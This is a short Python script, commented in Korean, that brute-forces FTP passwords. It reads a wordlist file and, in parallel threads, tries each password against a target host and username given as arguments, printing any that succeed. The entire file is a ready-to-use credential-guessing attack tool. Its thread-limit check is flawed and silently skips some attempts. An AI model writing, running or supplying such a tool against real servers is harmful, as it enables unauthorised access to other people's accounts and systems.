#!/usr/bin/python3
# FTP passward 크랙
# ftplib를 사용
# threading 추가

import sys
import os
import ftplib
import threading

# ftp로그인 작업
def ftplogin(passwd):
    global host_ip, port, username
    if threading.active_count() < 10:
        try:
            serv = ftplib.FTP()
            serv.connect(host_ip, port, timeout=30)
            serv.login(username, passwd)
            print("Success\n  %s Password : %s" % (username, passwd))
            serv.quit()
            return
        except:
            print("test Password : %s" % (passwd))
            return


# os.system("ftp "+ host_ip)
# sys.stdout(username)
# os.system("user1.")

# 사용법
if len(sys.argv) != 3 :
    print("USAGE: pyhon pwcrack.py [host_ip] [username]")
    quit(1)

host_ip = sys.argv[1]
port = 21
username = sys.argv[2]
passwd = "user1."

# 사전파일과 실제 공격(threading 사용)
f = open("Dictionary.txt","rt")
for passwd in f.readlines():
    thread = threading.Thread(target=ftplogin, args=(passwd.strip(),))
    thread.start()
f.close()

